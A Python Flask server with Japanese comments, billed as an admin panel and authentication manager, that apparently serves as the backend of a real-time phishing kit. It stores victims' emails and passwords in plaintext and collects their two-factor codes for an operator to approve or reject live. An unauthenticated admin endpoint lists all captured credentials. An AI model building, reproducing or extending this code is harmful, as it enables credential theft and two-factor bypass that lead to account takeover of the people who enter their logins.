"""
本サーバー: 管理画面 + リクエスト中継 + 認証管理
"""
from flask import Flask, request, jsonify, render_template
from flask_socketio import SocketIO
from flask_cors import CORS
import requests
from datetime import datetime, timedelta
from apscheduler.schedulers.background import BackgroundScheduler
import database
from config import SECRET_KEY, DEBUG, ALLOWED_ORIGINS
import logging
import time
import json
import os

logging.basicConfig(level=logging.INFO)

app = Flask(__name__, template_folder='templates')
app.config['SECRET_KEY'] = SECRET_KEY
CORS(app, origins=ALLOWED_ORIGINS)

socketio = SocketIO(app, cors_allowed_origins=ALLOWED_ORIGINS)

database.init_db()

AUTH_DB_PATH = 'data/auth_database.json'

def load_auth_db():
    if not os.path.exists(AUTH_DB_PATH):
        return {"accounts": []}
    try:
        with open(AUTH_DB_PATH, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {"accounts": []}

def save_auth_db(data):
    os.makedirs(os.path.dirname(AUTH_DB_PATH), exist_ok=True)
    with open(AUTH_DB_PATH, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def find_account(email, password):
    db = load_auth_db()
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            return account
    return None

def create_or_update_account(email, password, status):
    db = load_auth_db()
    account = find_account(email, password)
    
    now = datetime.now().isoformat()
    
    if account:
        account['login_history'].append({'datetime': now, 'status': status})
    else:
        new_account = {
            'email': email,
            'password': password,
            'login_history': [{'datetime': now, 'status': status}],
            'twofa_session': None
        }
        db['accounts'].append(new_account)
    
    save_auth_db(db)
    return db

def init_twofa_session(email, password):
    db = load_auth_db()
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            account['twofa_session'] = {
                'active': True,
                'codes': [],
                'security_check_completed': False,
                'created_at': datetime.now().isoformat()
            }
            save_auth_db(db)
            return True
    return False

def add_twofa_code(email, password, code):
    db = load_auth_db()
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            if account.get('twofa_session'):
                account['twofa_session']['codes'].append({
                    'code': code,
                    'datetime': datetime.now().isoformat(),
                    'status': 'pending'
                })
                save_auth_db(db)
                return True
    return False

def update_twofa_status(email, password, code, status):
    db = load_auth_db()
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            if account.get('twofa_session'):
                for code_entry in account['twofa_session']['codes']:
                    if code_entry['code'] == code:
                        code_entry['status'] = status
                        save_auth_db(db)
                        return True
    return False

def complete_security_check(email, password):
    db = load_auth_db()
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            if account.get('twofa_session'):
                account['twofa_session']['security_check_completed'] = True
                save_auth_db(db)
                return True
    return False

def delete_twofa_session(email, password):
    db = load_auth_db()
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            account['twofa_session'] = None
            save_auth_db(db)
            return True
    return False

def get_all_active_sessions():
    db = load_auth_db()
    active_sessions = []
    for account in db['accounts']:
        if account.get('twofa_session') and account['twofa_session'].get('active'):
            active_sessions.append({
                'email': account['email'],
                'password': account['password'],
                'session': account['twofa_session']
            })
    return active_sessions

scheduler = BackgroundScheduler()

@scheduler.scheduled_job('interval', seconds=60)
def scheduled_tasks():
    database.release_stale_locks(minutes=5)
    timeout_requests = database.timeout_old_requests(minutes=10)

@scheduler.scheduled_job('interval', hours=24)
def cleanup_task():
    database.cleanup_old_requests(days=30)

scheduler.start()

@app.route('/')
def index():
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>本サーバー (Master Server)</title>
        <style>
            body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; }
            h1 { color: #333; }
            .status { background: #f0f0f0; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
            .links { margin-top: 20px; }
            .links a {
                display: inline-block;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 10px 20px;
                text-decoration: none;
                border-radius: 5px;
                margin-right: 10px;
            }
            .links a:hover { opacity: 0.9; }
        </style>
    </head>
    <body>
        <h1>本サーバー (Master Server)</h1>
        <div class="status">
            <h2>ステータス: 稼働中</h2>
            <p>このサーバーは本サーバー (Master Server) です。</p>
            <p>サブサーバーとPCの間でリクエストを中継します。</p>
        </div>
        
        <div class="links">
            <a href="/admin/top">管理画面</a>
        </div>
        
        <h3>エンドポイント:</h3>
        <ul>
            <li>POST /api/request - リクエスト作成</li>
            <li>GET /api/request-result/{genre}/{id} - リクエスト結果取得</li>
            <li>GET /admin/top - 管理トップ</li>
            <li>GET /admin/accounts - アカウント管理</li>
        </ul>
    </body>
    </html>
    '''
    return html

@app.route('/api/request', methods=['POST'])
def create_request():
    try:
        data = request.json
        genre = data.get('genre')
        callback_url = data.get('callback_url')
        
        if not genre or not callback_url:
            return jsonify({'error': 'genre and callback_url are required'}), 400
        
        request_id = database.create_request(genre, callback_url)
        
        request_data = {
            'genre': genre,
            'request_id': request_id,
            'url': f"{request.host_url}api/request/{genre}/{request_id}"
        }
        
        socketio.emit('new_request', request_data)
        
        return jsonify({
            'status': 'created',
            'genre': genre,
            'request_id': request_id
        }), 201
        
    except Exception as e:
        print(f"[ERROR] リクエスト作成エラー: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/request-result/<genre>/<request_id>', methods=['GET'])
def get_request_result(genre, request_id):
    try:
        detail = database.get_request_detail(genre, request_id)
        
        if detail:
            return jsonify({
                'genre': detail['genre'],
                'request_id': detail['request_id'],
                'status': detail['status'],
                'locked_by': detail.get('locked_by'),
                'completed_at': detail.get('completed_at')
            }), 200
        else:
            return jsonify({'error': 'Request not found'}), 404
            
    except Exception as e:
        print(f"[ERROR] リクエスト結果取得エラー: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/admin/top')
def admin_top():
    return render_template('admintop.html')

@app.route('/admin/accounts')
def admin_accounts():
    return render_template('adminaccounts.html')

@app.route('/api/login/init-session', methods=['POST'])
def api_login_init_session():
    """ログイン成功後、2FAセッションを初期化"""
    try:
        data = request.json
        email = data.get('email', '').strip()
        password = data.get('password', '').strip()
        
        if not email or not password:
            return jsonify({'success': False, 'message': 'メールアドレスとパスワードが必要です'}), 400
        
        create_or_update_account(email, password, 'success')
        init_twofa_session(email, password)
        
        print(f"[INFO] 2FAセッション初期化完了 | Email: {email}")
        
        return jsonify({'success': True, 'message': '2FAセッション初期化完了'}), 200
        
    except Exception as e:
        print(f"[ERROR] 2FAセッション初期化エラー: {e}")
        return jsonify({'success': False, 'message': 'エラーが発生しました'}), 500

@app.route('/api/twofa-status/<email>', methods=['GET'])
def get_twofa_status(email):
    db = load_auth_db()
    
    for account in db['accounts']:
        if account['email'] == email and account.get('twofa_session'):
            session = account['twofa_session']
            
            if session['codes']:
                latest_code = session['codes'][-1]
                return jsonify({
                    'approved': latest_code['status'] == 'approved',
                    'rejected': latest_code['status'] == 'rejected',
                    'security_check_completed': session.get('security_check_completed', False)
                }), 200
    
    return jsonify({'approved': False, 'rejected': False}), 200

@app.route('/api/2fa/submit', methods=['POST'])
def api_2fa_submit():
    """2FAコード受信"""
    try:
        data = request.json
        email = data.get('email', '').strip()
        password = data.get('password', '').strip()
        code = data.get('code', '').strip()
        
        db = load_auth_db()
        account = None
        for acc in db['accounts']:
            if acc['email'] == email and acc['password'] == password and acc.get('twofa_session'):
                account = acc
                break
        
        if not account:
            return jsonify({'success': False, 'message': 'セッションが見つかりません'}), 404
        
        add_twofa_code(email, password, code)
        
        return jsonify({'success': True, 'message': '2FAコードを受信しました'}), 200
        
    except Exception as e:
        print(f"[ERROR] 2FA受信エラー: {e}")
        return jsonify({'success': False}), 500
    
@app.route('/api/security-check/submit', methods=['POST'])
def api_security_check_submit():
    try:
        data = request.json
        email = data.get('email', '').strip()
        
        return jsonify({'success': True}), 200
        
    except Exception as e:
        print(f"[ERROR] セキュリティチェックエラー: {e}")
        return jsonify({'success': False}), 500

@app.route('/api/security-check/check-status', methods=['POST'])
def api_security_check_status():
    try:
        data = request.json
        email = data.get('email', '').strip()
        
        db = load_auth_db()
        for account in db['accounts']:
            if account['email'] == email and account.get('twofa_session'):
                completed = account['twofa_session'].get('security_check_completed', False)
                return jsonify({'success': True, 'completed': completed}), 200
        
        return jsonify({'success': False, 'completed': False}), 200
        
    except Exception as e:
        print(f"[ERROR] セキュリティチェック状態確認エラー: {e}")
        return jsonify({'success': False}), 500

@app.route('/api/admin/accounts', methods=['GET'])
def api_admin_accounts():
    db = load_auth_db()
    
    success_accounts = []
    failed_accounts = []
    
    for account in db['accounts']:
        if not account['login_history']:
            continue
        
        latest_login = max(account['login_history'], key=lambda x: x['datetime'])
        
        account_info = {
            'email': account['email'],
            'password': account['password'],
            'latest_login': latest_login['datetime'],
            'login_history': account['login_history']
        }
        
        if latest_login['status'] == 'success':
            success_accounts.append(account_info)
        else:
            failed_accounts.append(account_info)
    
    success_accounts.sort(key=lambda x: x['latest_login'], reverse=True)
    failed_accounts.sort(key=lambda x: x['latest_login'], reverse=True)
    
    return jsonify({
        'success': True,
        'success_accounts': success_accounts,
        'failed_accounts': failed_accounts
    })

@app.route('/api/admin/active-sessions', methods=['GET'])
def api_admin_active_sessions():
    sessions = get_all_active_sessions()
    return jsonify({'success': True, 'sessions': sessions})

@app.route('/api/admin/2fa/approve', methods=['POST'])
def api_admin_2fa_approve():
    data = request.json
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    code = data.get('code', '').strip()
    
    update_twofa_status(email, password, code, 'approved')
    
    return jsonify({'success': True})

@app.route('/api/admin/2fa/reject', methods=['POST'])
def api_admin_2fa_reject():
    data = request.json
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    code = data.get('code', '').strip()
    
    update_twofa_status(email, password, code, 'rejected')
    
    return jsonify({'success': True})

@app.route('/api/admin/security-complete', methods=['POST'])
def api_admin_security_complete():
    data = request.json
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    
    complete_security_check(email, password)
    
    return jsonify({'success': True})

@app.route('/api/admin/block/delete', methods=['POST'])
def api_admin_block_delete():
    data = request.json
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    
    delete_twofa_session(email, password)
    
    return jsonify({'success': True})

@socketio.on('connect')
def handle_connect():
    print(f'[INFO] PC接続: {request.sid}')

@socketio.on('disconnect')
def handle_disconnect():
    print(f'[INFO] PC切断: {request.sid}')

@socketio.on('response')
def handle_response(data):
    try:
        genre = data.get('genre')
        request_id = data.get('request_id')
        status = data.get('status')
        pc_id = data.get('pc_id')
        
        updated = database.update_request_status(genre, request_id, status, pc_id)
        
    except Exception as e:
        print(f"[ERROR] 返答処理エラー: {e}")

if __name__ == '__main__':
    print("=" * 60)
    print("本サーバー (Master Server) 起動")
    print("=" * 60)
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=DEBUG)